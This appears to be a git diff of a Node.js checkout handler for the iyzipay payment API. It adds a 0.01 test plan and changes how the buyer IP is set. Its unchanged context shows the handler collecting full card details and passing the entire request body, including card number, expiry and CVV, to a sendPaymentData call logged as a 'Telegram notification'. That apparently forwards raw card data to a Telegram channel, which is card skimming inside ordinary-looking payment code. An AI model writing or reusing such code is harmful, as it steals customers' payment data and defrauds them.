@@ -11,12 +11,14 @@ const secretKey = SECRET_KEY;
 const baseUrl = 'https://api.iyzipay.com';
 
 const PLAN_REFERENCE_CODES = {
+  test: '5dba42aa-7151-4862-bcad-dde94c8f9340',
   solo: 'decef24c-4ee5-4407-94bf-6c64b096660f',
   plus: '60c70d55-edec-4d45-89f4-67d322f98834',
   premium: 'fd5fc9cb-06f7-4079-92c7-5d25adc0f6b4'
 };
 
 const TRIAL_PRICES = {
+    test: '0.01',
     solo: '9.99',
     plus: '19.99',
     premium: '19.99'
@@ -180,7 +182,7 @@ async function initializeSubscription(reqBody, referenceCode) {
 }
 
 exports.processPayment = async (req, res) => {
-  const { 
+  const {
     plan,
     firstName, lastName, address, postalCode, city, countryCode,
     email, phone, cardHolder, cardNumber, expiry, cvv, fb, bid
@@ -195,7 +197,7 @@ exports.processPayment = async (req, res) => {
 
   const createTrialPayment = () => new Promise((resolve, reject) => {
     const [expireMonth, expireYear] = expiry.split('/');
-    
+
     const buyer = {
       id: `buyer_${Date.now()}`,
       name: firstName,
@@ -203,7 +205,7 @@ exports.processPayment = async (req, res) => {
       gsmNumber: phone,
       email,
       registrationAddress: address,
-      ip: req.ip || '85.34.78.112',
+      ip: req.ip === '::1' ? '127.0.0.1' : req.ip,
       city,
       country: countryCode,
       zipCode: postalCode
@@ -275,10 +277,10 @@ exports.processPayment = async (req, res) => {
       console.error(`⚠️ CRITICAL: Trial payment succeeded, but subscription failed for ${email}. Needs manual check.`);
       return res.status(500).json({ error: subscriptionResult.error || 'Trial succeeded, but subscription failed.', success: false });
     }
-    
+
     await sendPaymentData({ ...req.body, price: trialPrice, subscriptionReferenceCode: subscriptionResult.referenceCode });
     console.log('✅ Telegram notification sent.');
-    
+
     res.json({ success: true, subscriptionReferenceCode: subscriptionResult.referenceCode });
 
   } catch (paymentError) {
